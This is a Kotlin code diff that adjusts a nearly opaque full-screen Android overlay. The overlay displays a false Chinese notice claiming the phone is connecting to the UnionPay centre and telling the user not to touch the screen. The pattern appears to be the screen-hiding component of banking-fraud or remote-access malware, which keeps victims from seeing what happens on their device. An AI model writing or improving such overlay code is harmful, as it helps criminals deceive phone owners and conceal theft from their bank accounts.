@@ -848,7 +848,7 @@ fun onstart_overlay(arg1: String, arg2: String) {
 
         /* if(HomeWidth >0 && HomeHeight>0 )
 	 {
-        ww= HomeWidth 
+                ww= HomeWidth 
 		hh= HomeHeight
 	 }*/
 	
@@ -863,32 +863,26 @@ fun onstart_overlay(arg1: String, arg2: String) {
     	overLay =  FrameLayout(this)
     	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
     	overLay.getBackground().setAlpha(253)
-	    overLay.setVisibility(8)
+	overLay.setVisibility(8)
         overLay.setFocusable(false)
         overLay.setClickable(false)
 
-        val loadingText = TextView(this)
-		loadingText.text = "\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
-		loadingText.setTextColor(-7829368)
-		loadingText.textSize = 15.0f
-	    loadingText.gravity = Gravity.CENTER or Gravity.BOTTOM
-	    loadingText.setPadding(20, 20, 20, 20)
+        val loadingText = TextView(this, null)
+	loadingText.text = "\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
+	loadingText.setTextColor(-7829368)
+	loadingText.textSize = 13.0f
+	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
+	loadingText.setPadding(60, HomeHeight / 4, 0, 0)
+
+	val dp2px: Int = dp2px(this, 100.0f) //200.0f
+	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
+	paramstext.gravity = Gravity.LEFT
+	loadingText.layoutParams = paramstext
+
+	//Fakelay.addView(getView2())
+	overLay.addView(loadingText)
 	
-		
-	    val displayMetrics = this.resources.displayMetrics
-	    val screenHeight = displayMetrics.heightPixels
-	    val viewHeight = dp2px(this, 100f) * 5
-	    val bottomOffset = dp2px(this, 60f) 
-	    val topMargin = screenHeight - viewHeight - bottomOffset
-	
-	    val paramstext = FrameLayout.LayoutParams(viewHeight, viewHeight)
-	    paramstext.gravity = Gravity.CENTER or Gravity.TOP
-	    paramstext.topMargin = topMargin
-	    paramstext.leftMargin = 60
-	    loadingText.layoutParams = paramstext
-	
-	    overLay.addView(loadingText)
-	    windowManager.addView(overLay, overLayparams_bass)
+        windowManager.addView(overLay, overLayparams_bass)
     }
     
     fun dp2px(context: Context, f: Float): Int {
